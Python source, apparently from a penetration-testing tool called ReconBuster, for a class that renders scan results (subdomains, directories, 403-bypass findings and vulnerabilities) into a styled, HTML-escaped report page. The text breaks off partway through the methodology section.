"""
ReconBuster Professional Report Generator
Cyberpunk-themed Penetration Testing Report
"""

import os
import json
import base64
from datetime import datetime
from typing import List, Dict, Any
from pathlib import Path
import html


class ReportGenerator:
    """
    Professional Cyberpunk-themed Report Generator
    - Stunning HTML reports with pentesting standards
    - Cover page with target info
    - Executive summary
    - Detailed findings with reproduction steps
    - Sensitive data extraction results
    - CVSS scores and remediation
    """

    def __init__(self, output_dir: str = None):
        self.output_dir = output_dir or str(Path(__file__).parent.parent / "reports")
        os.makedirs(self.output_dir, exist_ok=True)

        self.scan_data = {
            "target": "",
            "scan_date": datetime.now().isoformat(),
            "scan_duration": "",
            "subdomains": [],
            "directories": [],
            "bypasses": [],
            "vulnerabilities": [],
            "technologies": {},
            "stats": {},
            "scan_id": datetime.now().strftime("%Y%m%d%H%M%S")
        }

    def set_target(self, target: str):
        self.scan_data["target"] = target

    def set_duration(self, duration: str):
        self.scan_data["scan_duration"] = duration

    def add_subdomains(self, subdomains: List[Dict]):
        self.scan_data["subdomains"] = subdomains

    def add_directories(self, directories: List[Dict]):
        self.scan_data["directories"] = directories

    def add_bypasses(self, bypasses: List[Dict]):
        self.scan_data["bypasses"] = bypasses

    def add_vulnerabilities(self, vulnerabilities: List[Dict]):
        self.scan_data["vulnerabilities"] = vulnerabilities

    def add_technologies(self, technologies: Dict):
        self.scan_data["technologies"] = technologies

    def add_stats(self, stats: Dict):
        self.scan_data["stats"] = stats

    def _get_severity_color(self, severity: str) -> str:
        """Get color for severity level"""
        colors = {
            "critical": "#ff0055",
            "high": "#ff6b35",
            "medium": "#ffcc00",
            "low": "#00ff88",
            "info": "#00f0ff"
        }
        return colors.get(severity.lower(), "#00f0ff")

    def _get_cvss_score(self, severity: str) -> str:
        """Get CVSS score range for severity"""
        scores = {
            "critical": "9.0 - 10.0",
            "high": "7.0 - 8.9",
            "medium": "4.0 - 6.9",
            "low": "0.1 - 3.9",
            "info": "0.0"
        }
        return scores.get(severity.lower(), "N/A")

    def _escape_html(self, text: str) -> str:
        """Escape HTML special characters"""
        if not text:
            return ""
        return html.escape(str(text))

    def generate_html(self) -> str:
        """Generate professional cyberpunk HTML report"""
        target = self._escape_html(self.scan_data['target'])
        date = datetime.now().strftime("%B %d, %Y at %H:%M UTC")
        duration = self.scan_data.get('scan_duration', 'N/A')
        scan_id = self.scan_data.get('scan_id', 'N/A')

        subdomains = self.scan_data.get('subdomains', [])
        directories = self.scan_data.get('directories', [])
        bypasses = self.scan_data.get('bypasses', [])
        vulns = self.scan_data.get('vulnerabilities', [])

        # Count by severity
        critical = len([v for v in vulns if v.get('severity') == 'critical'])
        high = len([v for v in vulns if v.get('severity') == 'high'])
        medium = len([v for v in vulns if v.get('severity') == 'medium'])
        low = len([v for v in vulns if v.get('severity') == 'low'])

        # Count bypasses by confidence
        high_conf_bypasses = len([b for b in bypasses if b.get('confidence') == 'high'])
        med_conf_bypasses = len([b for b in bypasses if b.get('confidence') == 'medium'])

        # Calculate risk score
        risk_score = min(100, critical * 25 + high * 15 + medium * 5 + low * 2 + len(bypasses) * 10)

        html_content = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ReconBuster Security Report - {target}</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&family=Fira+Code:wght@400;500;600;700&display=swap');

        :root {{
            --primary: #00f0ff;
            --secondary: #b829ff;
            --accent: #ff0055;
            --success: #00ff88;
            --warning: #ffcc00;
            --danger: #ff0055;
            --bg-dark: #0a0a0f;
            --bg-card: #12121a;
            --bg-lighter: #1a1a25;
            --text: #e0e0e0;
            --text-dim: #888;
            --border: #2a2a3a;
            --glow-primary: 0 0 20px rgba(0, 240, 255, 0.5);
            --glow-secondary: 0 0 20px rgba(184, 41, 255, 0.5);
            --glow-accent: 0 0 20px rgba(255, 0, 85, 0.5);
        }}

        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}

        body {{
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: var(--bg-dark);
            color: var(--text);
            line-height: 1.7;
            min-height: 100vh;
            font-size: 15px;
            font-weight: 400;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }}

        /* Cover Page */
        .cover-page {{
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #0a0a0f 0%, #12121a 50%, #1a1025 100%);
            position: relative;
            overflow: hidden;
            page-break-after: always;
        }}

        .cover-page::before {{
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background:
                repeating-linear-gradient(
                    0deg,
                    transparent,
                    transparent 2px,
                    rgba(0, 240, 255, 0.03) 2px,
                    rgba(0, 240, 255, 0.03) 4px
                );
            pointer-events: none;
        }}

        .cover-logo {{
            font-family: 'Space Grotesk', sans-serif;
            font-size: 4rem;
            font-weight: 700;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 50px rgba(0, 240, 255, 0.5);
            margin-bottom: 1rem;
            letter-spacing: 0.15em;
        }}

        .cover-subtitle {{
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 1.1rem;
            color: var(--text-dim);
            letter-spacing: 0.3em;
            margin-bottom: 4rem;
            font-weight: 400;
        }}

        .cover-target-box {{
            background: var(--bg-card);
            border: 2px solid var(--primary);
            border-radius: 10px;
            padding: 3rem 5rem;
            text-align: center;
            box-shadow: var(--glow-primary);
            position: relative;
        }}

        .cover-target-box::before {{
            content: 'TARGET';
            position: absolute;
            top: -12px;
            left: 50%;
            transform: translateX(-50%);
            background: var(--bg-dark);
            padding: 0 1rem;
            font-family: 'JetBrains Mono', monospace;
            color: var(--primary);
            font-size: 0.75rem;
            letter-spacing: 0.2em;
            font-weight: 600;
        }}

        .cover-target {{
            font-family: 'Space Grotesk', sans-serif;
            font-size: 2.2rem;
            font-weight: 600;
            color: var(--primary);
            text-shadow: var(--glow-primary);
            word-break: break-all;
        }}

        .cover-info {{
            display: flex;
            gap: 4rem;
            margin-top: 4rem;
        }}

        .cover-info-item {{
            text-align: center;
        }}

        .cover-info-label {{
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.7rem;
            color: var(--text-dim);
            letter-spacing: 0.15em;
            margin-bottom: 0.5rem;
            font-weight: 500;
        }}

        .cover-info-value {{
            font-family: 'Inter', sans-serif;
            font-size: 1.1rem;
            color: var(--text);
            font-weight: 500;
        }}

        .cover-classification {{
            position: absolute;
            bottom: 50px;
            font-family: 'Space Grotesk', sans-serif;
            font-size: 0.9rem;
            font-weight: 600;
            color: var(--accent);
            letter-spacing: 0.4em;
            padding: 1rem 2rem;
            border: 2px solid var(--accent);
            border-radius: 5px;
        }}

        /* Main Container */
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 40px 20px;
        }}

        /* Section Headers */
        .section {{
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 12px;
            margin-bottom: 30px;
            overflow: hidden;
        }}

        .section-header {{
            background: linear-gradient(135deg, var(--bg-lighter), var(--bg-card));
            padding: 20px 25px;
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            gap: 15px;
        }}

        .section-icon {{
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.2rem;
        }}

        .section-title {{
            font-family: 'Space Grotesk', sans-serif;
            font-size: 1.2rem;
            font-weight: 600;
            color: var(--text);
            letter-spacing: 0.05em;
        }}

        .section-body {{
            padding: 25px;
        }}

        /* Executive Summary */
        .exec-summary {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }}

        .summary-card {{
            background: var(--bg-lighter);
            border: 1px solid var(--border);
            border-radius: 10px;
            padding: 25px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }}

        .summary-card::before {{
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
        }}

        .summary-card.critical::before {{ background: var(--danger); box-shadow: 0 0 15px var(--danger); }}
        .summary-card.high::before {{ background: #ff6b35; box-shadow: 0 0 15px #ff6b35; }}
        .summary-card.medium::before {{ background: var(--warning); box-shadow: 0 0 15px var(--warning); }}
        .summary-card.success::before {{ background: var(--success); box-shadow: 0 0 15px var(--success); }}
        .summary-card.info::before {{ background: var(--primary); box-shadow: 0 0 15px var(--primary); }}

        .summary-number {{
            font-family: 'Space Grotesk', sans-serif;
            font-size: 2.8rem;
            font-weight: 700;
            margin-bottom: 5px;
        }}

        .summary-card.critical .summary-number {{ color: var(--danger); text-shadow: 0 0 20px var(--danger); }}
        .summary-card.high .summary-number {{ color: #ff6b35; text-shadow: 0 0 20px #ff6b35; }}
        .summary-card.medium .summary-number {{ color: var(--warning); }}
        .summary-card.success .summary-number {{ color: var(--success); text-shadow: 0 0 20px var(--success); }}
        .summary-card.info .summary-number {{ color: var(--primary); text-shadow: 0 0 20px var(--primary); }}

        .summary-label {{
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.75rem;
            color: var(--text-dim);
            letter-spacing: 0.08em;
            font-weight: 500;
        }}

        /* Risk Gauge */
        .risk-gauge {{
            background: var(--bg-lighter);
            border: 1px solid var(--border);
            border-radius: 10px;
            padding: 30px;
            margin-bottom: 30px;
            text-align: center;
        }}

        .risk-gauge-title {{
            font-family: 'Space Grotesk', sans-serif;
            font-size: 1rem;
            font-weight: 600;
            color: var(--text-dim);
            margin-bottom: 20px;
            letter-spacing: 0.1em;
        }}

        .risk-bar {{
            height: 30px;
            background: linear-gradient(90deg, var(--success) 0%, var(--warning) 50%, var(--danger) 100%);
            border-radius: 15px;
            position: relative;
            margin-bottom: 15px;
        }}

        .risk-indicator {{
            position: absolute;
            top: -5px;
            width: 40px;
            height: 40px;
            background: var(--bg-dark);
            border: 3px solid var(--text);
            border-radius: 50%;
            transform: translateX(-50%);
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Space Grotesk', sans-serif;
            font-size: 0.7rem;
            font-weight: 700;
            box-shadow: 0 0 15px rgba(0,0,0,0.5);
        }}

        .risk-score {{
            font-family: 'Space Grotesk', sans-serif;
            font-size: 2.5rem;
            font-weight: 700;
        }}

        .risk-score.low {{ color: var(--success); }}
        .risk-score.medium {{ color: var(--warning); }}
        .risk-score.high {{ color: #ff6b35; }}
        .risk-score.critical {{ color: var(--danger); text-shadow: 0 0 20px var(--danger); }}

        /* Bypass Cards */
        .bypass-card {{
            background: var(--bg-lighter);
            border: 1px solid var(--border);
            border-radius: 10px;
            margin-bottom: 20px;
            overflow: hidden;
        }}

        .bypass-card.high {{ border-left: 4px solid var(--success); }}
        .bypass-card.medium {{ border-left: 4px solid var(--warning); }}
        .bypass-card.low {{ border-left: 4px solid var(--primary); }}

        .bypass-header {{
            background: linear-gradient(135deg, rgba(0, 255, 136, 0.1), transparent);
            padding: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--border);
        }}

        .bypass-title {{
            font-family: 'Space Grotesk', sans-serif;
            font-size: 1.1rem;
            color: var(--success);
        }}

        .bypass-badge {{
            padding: 5px 15px;
            border-radius: 20px;
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 0.75rem;
            letter-spacing: 0.1em;
        }}

        .bypass-badge.verified {{
            background: rgba(0, 255, 136, 0.2);
            color: var(--success);
            border: 1px solid var(--success);
        }}

        .bypass-body {{
            padding: 20px;
        }}

        .bypass-detail {{
            display: grid;
            grid-template-columns: 150px 1fr;
            gap: 10px;
            margin-bottom: 15px;
            align-items: start;
        }}

        .bypass-label {{
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 0.85rem;
            color: var(--text-dim);
        }}

        .bypass-value {{
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 0.9rem;
            color: var(--text);
            word-break: break-all;
        }}

        .bypass-value.url {{
            color: var(--primary);
        }}

        /* Content Length Comparison */
        .content-comparison {{
            display: flex;
            gap: 20px;
            margin: 15px 0;
            padding: 15px;
            background: var(--bg-card);
            border-radius: 8px;
        }}

        .content-box {{
            flex: 1;
            text-align: center;
            padding: 15px;
            border-radius: 8px;
        }}

        .content-box.before {{
            background: rgba(255, 0, 85, 0.1);
            border: 1px solid rgba(255, 0, 85, 0.3);
        }}

        .content-box.after {{
            background: rgba(0, 255, 136, 0.1);
            border: 1px solid rgba(0, 255, 136, 0.3);
        }}

        .content-box-label {{
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 0.75rem;
            color: var(--text-dim);
            margin-bottom: 5px;
        }}

        .content-box-value {{
            font-family: 'Space Grotesk', sans-serif;
            font-size: 1.5rem;
            font-weight: 600;
        }}

        .content-box.before .content-box-value {{ color: var(--accent); }}
        .content-box.after .content-box-value {{ color: var(--success); }}

        /* Sensitive Data */
        .sensitive-data {{
            margin-top: 20px;
            padding: 20px;
            background: rgba(255, 0, 85, 0.05);
            border: 1px solid rgba(255, 0, 85, 0.3);
            border-radius: 8px;
        }}

        .sensitive-title {{
            font-family: 'Space Grotesk', sans-serif;
            font-size: 0.9rem;
            color: var(--accent);
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }}

        .sensitive-item {{
            display: flex;
            align-items: center;
            gap: 15px;
            padding: 10px;
            background: var(--bg-card);
            border-radius: 5px;
            margin-bottom: 8px;
        }}

        .sensitive-category {{
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 0.75rem;
            padding: 3px 10px;
            border-radius: 3px;
            min-width: 100px;
            text-align: center;
        }}

        .sensitive-category.critical {{ background: var(--danger); color: white; }}
        .sensitive-category.high {{ background: #ff6b35; color: white; }}
        .sensitive-category.medium {{ background: var(--warning); color: #333; }}
        .sensitive-category.low {{ background: var(--success); color: #333; }}

        .sensitive-value {{
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 0.9rem;
            color: var(--text);
        }}

        /* Reproduction Steps */
        .reproduction-steps {{
            margin-top: 20px;
            padding: 20px;
            background: var(--bg-card);
            border: 1px solid var(--border);
            border-radius: 8px;
        }}

        .reproduction-title {{
            font-family: 'Space Grotesk', sans-serif;
            font-size: 0.9rem;
            color: var(--primary);
            margin-bottom: 15px;
        }}

        .step {{
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 0.85rem;
            color: var(--text);
            padding: 8px 0;
            border-bottom: 1px solid var(--border);
        }}

        .step:last-child {{
            border-bottom: none;
        }}

        .step code {{
            background: var(--bg-lighter);
            padding: 10px 15px;
            border-radius: 5px;
            display: block;
            margin-top: 10px;
            color: var(--success);
            border-left: 3px solid var(--primary);
        }}

        /* Vulnerability Cards */
        .vuln-card {{
            background: var(--bg-lighter);
            border: 1px solid var(--border);
            border-radius: 10px;
            margin-bottom: 20px;
            overflow: hidden;
        }}

        .vuln-header {{
            padding: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }}

        .vuln-header.critical {{ background: linear-gradient(135deg, rgba(255, 0, 85, 0.2), transparent); border-left: 4px solid var(--danger); }}
        .vuln-header.high {{ background: linear-gradient(135deg, rgba(255, 107, 53, 0.2), transparent); border-left: 4px solid #ff6b35; }}
        .vuln-header.medium {{ background: linear-gradient(135deg, rgba(255, 204, 0, 0.2), transparent); border-left: 4px solid var(--warning); }}
        .vuln-header.low {{ background: linear-gradient(135deg, rgba(0, 255, 136, 0.2), transparent); border-left: 4px solid var(--success); }}

        .vuln-title {{
            font-family: 'Space Grotesk', sans-serif;
            font-size: 1.1rem;
        }}

        .vuln-header.critical .vuln-title {{ color: var(--danger); }}
        .vuln-header.high .vuln-title {{ color: #ff6b35; }}
        .vuln-header.medium .vuln-title {{ color: var(--warning); }}
        .vuln-header.low .vuln-title {{ color: var(--success); }}

        .vuln-severity {{
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 0.75rem;
            padding: 5px 15px;
            border-radius: 20px;
            letter-spacing: 0.1em;
        }}

        .vuln-severity.critical {{ background: var(--danger); color: white; }}
        .vuln-severity.high {{ background: #ff6b35; color: white; }}
        .vuln-severity.medium {{ background: var(--warning); color: #333; }}
        .vuln-severity.low {{ background: var(--success); color: #333; }}

        .vuln-body {{
            padding: 20px;
            border-top: 1px solid var(--border);
        }}

        .vuln-field {{
            margin-bottom: 20px;
        }}

        .vuln-field-label {{
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 0.8rem;
            color: var(--text-dim);
            margin-bottom: 8px;
            letter-spacing: 0.1em;
        }}

        .vuln-field-value {{
            font-size: 0.95rem;
            color: var(--text);
            line-height: 1.6;
        }}

        .vuln-evidence {{
            background: var(--bg-card);
            padding: 15px;
            border-radius: 5px;
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 0.85rem;
            color: var(--success);
            border-left: 3px solid var(--primary);
            white-space: pre-wrap;
            word-break: break-all;
        }}

        /* Tables */
        .data-table {{
            width: 100%;
            border-collapse: collapse;
        }}

        .data-table th {{
            background: var(--bg-card);
            padding: 15px;
            text-align: left;
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 0.85rem;
            color: var(--primary);
            border-bottom: 2px solid var(--border);
            letter-spacing: 0.1em;
        }}

        .data-table td {{
            padding: 12px 15px;
            border-bottom: 1px solid var(--border);
            font-size: 0.9rem;
        }}

        .data-table tr:hover td {{
            background: rgba(0, 240, 255, 0.05);
        }}

        .status-badge {{
            padding: 4px 12px;
            border-radius: 4px;
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 0.75rem;
        }}

        .status-badge.success {{ background: rgba(0, 255, 136, 0.2); color: var(--success); }}
        .status-badge.warning {{ background: rgba(255, 204, 0, 0.2); color: var(--warning); }}
        .status-badge.danger {{ background: rgba(255, 0, 85, 0.2); color: var(--danger); }}

        /* Methodology Section */
        .methodology {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
        }}

        .method-card {{
            background: var(--bg-lighter);
            border: 1px solid var(--border);
            border-radius: 10px;
            padding: 25px;
            position: relative;
            overflow: hidden;
        }}

        .method-card::before {{
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 4px;
            height: 100%;
            background: linear-gradient(180deg, var(--primary), var(--secondary));
        }}

        .method-number {{
            font-family: 'Space Grotesk', sans-serif;
            font-size: 2rem;
            font-weight: 700;
            color: var(--primary);
            opacity: 0.3;
            margin-bottom: 10px;
        }}

        .method-title {{
            font-family: 'Space Grotesk', sans-serif;
            font-size: 1rem;
            color: var(--text);
            margin-bottom: 10px;
        }}

        .method-desc {{
            font-size: 0.9rem;
            color: var(--text-dim);
            line-height: 1.5;
        }}

        /* Footer */
        .report-footer {{
            text-align: center;
            padding: 40px 20px;
            border-top: 1px solid var(--border);
            margin-top: 50px;
        }}

        .footer-logo {{
            font-family: 'Space Grotesk', sans-serif;
            font-size: 1.5rem;
            font-weight: 700;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }}

        .footer-text {{
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            font-size: 0.85rem;
            color: var(--text-dim);
        }}

        /* Print Styles */
        @media print {{
            body {{
                background: white;
                color: #333;
            }}

            .cover-page {{
                background: linear-gradient(135deg, #f5f5f5, #e0e0e0);
            }}

            .section {{
                border: 1px solid #ddd;
                break-inside: avoid;
            }}

            .bypass-card, .vuln-card {{
                break-inside: avoid;
            }}
        }}

        /* Page Break */
        .page-break {{
            page-break-after: always;
        }}
    </style>
</head>
<body>
    <!-- Cover Page -->
    <div class="cover-page">
        <div class="cover-logo">RECONBUSTER</div>
        <div class="cover-subtitle">SECURITY ASSESSMENT REPORT</div>

        <div class="cover-target-box">
            <div class="cover-target">{target}</div>
        </div>

        <div class="cover-info">
            <div class="cover-info-item">
                <div class="cover-info-label">SCAN DATE</div>
                <div class="cover-info-value">{date}</div>
            </div>
            <div class="cover-info-item">
                <div class="cover-info-label">DURATION</div>
                <div class="cover-info-value">{duration}</div>
            </div>
            <div class="cover-info-item">
                <div class="cover-info-label">REPORT ID</div>
                <div class="cover-info-value">{scan_id}</div>
            </div>
        </div>

        <div class="cover-classification">CONFIDENTIAL</div>
    </div>

    <!-- Main Report -->
    <div class="container">
        <!-- Executive Summary -->
        <div class="section">
            <div class="section-header">
                <div class="section-icon">01</div>
                <div class="section-title">EXECUTIVE SUMMARY</div>
            </div>
            <div class="section-body">
                <div class="exec-summary">
                    <div class="summary-card info">
                        <div class="summary-number">{len(subdomains)}</div>
                        <div class="summary-label">SUBDOMAINS</div>
                    </div>
                    <div class="summary-card info">
                        <div class="summary-number">{len(directories)}</div>
                        <div class="summary-label">DIRECTORIES</div>
                    </div>
                    <div class="summary-card success">
                        <div class="summary-number">{len(bypasses)}</div>
                        <div class="summary-label">403 BYPASSES</div>
                    </div>
                    <div class="summary-card critical">
                        <div class="summary-number">{critical}</div>
                        <div class="summary-label">CRITICAL</div>
                    </div>
                    <div class="summary-card high">
                        <div class="summary-number">{high}</div>
                        <div class="summary-label">HIGH</div>
                    </div>
                    <div class="summary-card medium">
                        <div class="summary-number">{medium}</div>
                        <div class="summary-label">MEDIUM</div>
                    </div>
                </div>

                <!-- Risk Score -->
                <div class="risk-gauge">
                    <div class="risk-gauge-title">OVERALL RISK SCORE</div>
                    <div class="risk-bar">
                        <div class="risk-indicator" style="left: {risk_score}%">{risk_score}</div>
                    </div>
                    <div class="risk-score {'critical' if risk_score >= 75 else 'high' if risk_score >= 50 else 'medium' if risk_score >= 25 else 'low'}">{risk_score}/100</div>
                </div>
            </div>
        </div>
'''

        # 403 Bypass Findings Section
        if bypasses:
            html_content += '''
        <!-- 403 Bypass Findings -->
        <div class="section">
            <div class="section-header">
                <div class="section-icon">02</div>
                <div class="section-title">403 BYPASS FINDINGS</div>
            </div>
            <div class="section-body">
'''
            for idx, b in enumerate(bypasses, 1):
                technique = self._escape_html(b.get('technique', 'Unknown'))
                original_url = self._escape_html(b.get('original_url', ''))
                bypass_url = self._escape_html(b.get('bypass_url', ''))
                category = self._escape_html(b.get('category', ''))
                confidence = b.get('confidence', 'low')
                original_status = b.get('original_status', 403)
                status_code = b.get('status_code', 200)
                content_length = b.get('content_length', 0)
                original_content_length = b.get('original_content_length', 0)
                page_title = self._escape_html(b.get('page_title', ''))
                sensitive_data = b.get('sensitive_data', [])
                reproduction_steps = b.get('reproduction_steps', [])

                html_content += f'''
                <div class="bypass-card {confidence}">
                    <div class="bypass-header">
                        <div class="bypass-title">#{idx} - {technique}</div>
                        <div class="bypass-badge verified">VERIFIED</div>
                    </div>
                    <div class="bypass-body">
                        <div class="bypass-detail">
                            <div class="bypass-label">Original URL:</div>
                            <div class="bypass-value url">{original_url}</div>
                        </div>
                        <div class="bypass-detail">
                            <div class="bypass-label">Bypass URL:</div>
                            <div class="bypass-value url">{bypass_url}</div>
                        </div>
                        <div class="bypass-detail">
                            <div class="bypass-label">Status Change:</div>
                            <div class="bypass-value">{original_status} &rarr; {status_code}</div>
                        </div>
                        <div class="bypass-detail">
                            <div class="bypass-label">Category:</div>
                            <div class="bypass-value">{category}</div>
                        </div>
                        <div class="bypass-detail">
                            <div class="bypass-label">Page Title:</div>
                            <div class="bypass-value">{page_title or 'N/A'}</div>
                        </div>
                        <div class="bypass-detail">
                            <div class="bypass-label">Confidence:</div>
                            <div class="bypass-value">{confidence.upper()}</div>
                        </div>

                        <!-- Content Length Comparison -->
                        <div class="content-comparison">
                            <div class="content-box before">
                                <div class="content-box-label">BEFORE BYPASS</div>
                                <div class="content-box-value">{original_content_length} bytes</div>
                            </div>
                            <div class="content-box after">
                                <div class="content-box-label">AFTER BYPASS</div>
                                <div class="content-box-value">{content_length} bytes</div>
                            </div>
                        </div>
'''

                # Sensitive Data Section
                if sensitive_data:
                    html_content += '''
                        <div class="sensitive-data">
                            <div class="sensitive-title">SENSITIVE DATA DISCOVERED</div>
'''
                    for sd in sensitive_data[:10]:
                        cat = sd.get('category', 'unknown')
                        severity = sd.get('severity', 'low')
                        masked_value = self._escape_html(sd.get('value_masked', ''))
                        html_content += f'''
                            <div class="sensitive-item">
                                <div class="sensitive-category {severity}">{cat.upper()}</div>
                                <div class="sensitive-value">{masked_value}</div>
                            </div>
'''
                    html_content += '''
                        </div>
'''

                # Reproduction Steps
                if reproduction_steps:
                    html_content += '''
                        <div class="reproduction-steps">
                            <div class="reproduction-title">MANUAL REPRODUCTION STEPS</div>
'''
                    for step in reproduction_steps:
                        step_escaped = self._escape_html(step)
                        if step.strip().startswith('curl'):
                            html_content += f'''
                            <div class="step"><code>{step_escaped}</code></div>
'''
                        else:
                            html_content += f'''
                            <div class="step">{step_escaped}</div>
'''
                    html_content += '''
                        </div>
'''

                html_content += '''
                    </div>
                </div>
'''

            html_content += '''
            </div>
        </div>
'''

        # Vulnerabilities Section
        if vulns:
            html_content += '''
        <!-- Vulnerabilities -->
        <div class="section">
            <div class="section-header">
                <div class="section-icon">03</div>
                <div class="section-title">VULNERABILITY FINDINGS</div>
            </div>
            <div class="section-body">
'''
            for v in sorted(vulns, key=lambda x: {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4}.get(x.get('severity', 'info'), 5)):
                sev = v.get('severity', 'info').lower()
                title = self._escape_html(v.get('title', 'Unknown'))
                url = self._escape_html(v.get('url', ''))
                description = self._escape_html(v.get('description', ''))
                evidence = self._escape_html(v.get('evidence', ''))
                remediation = self._escape_html(v.get('remediation', ''))
                cvss = self._get_cvss_score(sev)

                html_content += f'''
                <div class="vuln-card">
                    <div class="vuln-header {sev}">
                        <div class="vuln-title">{title}</div>
                        <div class="vuln-severity {sev}">{sev.upper()} | CVSS {cvss}</div>
                    </div>
                    <div class="vuln-body">
                        <div class="vuln-field">
                            <div class="vuln-field-label">AFFECTED URL</div>
                            <div class="vuln-field-value">{url}</div>
                        </div>
                        <div class="vuln-field">
                            <div class="vuln-field-label">DESCRIPTION</div>
                            <div class="vuln-field-value">{description}</div>
                        </div>
                        <div class="vuln-field">
                            <div class="vuln-field-label">EVIDENCE</div>
                            <div class="vuln-evidence">{evidence}</div>
                        </div>
                        <div class="vuln-field">
                            <div class="vuln-field-label">REMEDIATION</div>
                            <div class="vuln-field-value">{remediation}</div>
                        </div>
                    </div>
                </div>
'''
            html_content += '''
            </div>
        </div>
'''

        # Subdomains Section
        if subdomains:
            html_content += f'''
        <!-- Subdomains -->
        <div class="section">
            <div class="section-header">
                <div class="section-icon">04</div>
                <div class="section-title">DISCOVERED SUBDOMAINS ({len(subdomains)})</div>
            </div>
            <div class="section-body">
                <table class="data-table">
                    <thead>
                        <tr>
                            <th>SUBDOMAIN</th>
                            <th>IP ADDRESS</th>
                            <th>HTTP</th>
                            <th>HTTPS</th>
                            <th>TITLE</th>
                        </tr>
                    </thead>
                    <tbody>
'''
            for s in subdomains[:100]:
                subdomain = self._escape_html(s.get('subdomain', ''))
                ip = self._escape_html(s.get('ip_address', '-'))
                http_status = s.get('http_status', '-')
                https_status = s.get('https_status', '-')
                title = self._escape_html((s.get('title', '') or '-')[:40])

                http_class = 'success' if http_status == 200 else 'danger' if http_status in [403, 401] else 'warning'
                https_class = 'success' if https_status == 200 else 'danger' if https_status in [403, 401] else 'warning'

                html_content += f'''
                        <tr>
                            <td>{subdomain}</td>
                            <td>{ip}</td>
                            <td><span class="status-badge {http_class}">{http_status}</span></td>
                            <td><span class="status-badge {https_class}">{https_status}</span></td>
                            <td>{title}</td>
                        </tr>
'''
            html_content += '''
                    </tbody>
                </table>
            </div>
        </div>
'''

        # Directories Section
        if directories:
            html_content += f'''
        <!-- Directories -->
        <div class="section">
            <div class="section-header">
                <div class="section-icon">05</div>
                <div class="section-title">DISCOVERED DIRECTORIES ({len(directories)})</div>
            </div>
            <div class="section-body">
                <table class="data-table">
                    <thead>
                        <tr>
                            <th>URL</th>
                            <th>STATUS</th>
                            <th>SIZE</th>
                        </tr>
                    </thead>
                    <tbody>
'''
            for d in directories[:100]:
                url = self._escape_html(d.get('url', ''))
                status = d.get('status_code', 0)
                size = d.get('content_length', 0)

                status_class = 'success' if status == 200 else 'danger' if status in [403, 401] else 'warning'

                html_content += f'''
                        <tr>
                            <td>{url}</td>
                            <td><span class="status-badge {status_class}">{status}</span></td>
                            <td>{size} bytes</td>
                        </tr>
'''
            html_content += '''
                    </tbody>
                </table>
            </div>
        </div>
'''

        # Methodology Section
        html_content += '''
        <!-- Methodology -->
        <div class="section">
            <div class="section-header">
                <div class="section-icon">06</div>
                <div class="section-title">METHODOLOGY</div>
            </div>
            <div class="section-body">
                <div class="methodology">
                    <div class="method-card">
                        <div class="method-number">01</div>
                        <div class="method-title">Reconnaissance</div>
                        <div class="method-desc">Subdomain enumeration using 14+ sources including certificate transparency, DNS databases, and web archives.</div>
                    </div>
                    <div class="method-card">
                        <div class="method-number">02</div>
                        <div class="method-title">Directory Fuzzing</div>
                        <div class="method-desc">Async multi-threaded directory and file discovery with intelligent wildcard detection.</div>
                    </div>
                    <div class="method-card">
                        <div class="method-number">03</div>
                        <div class="method-title">403 Bypass Testing</div>
                        <div class="method-desc">300+ bypass techniques including header manipulation, path tricks, HTTP methods, and protocol exploitation.</div>
                    </div>
                    <div class="method-card">
                        <div class="method-number">04</div>
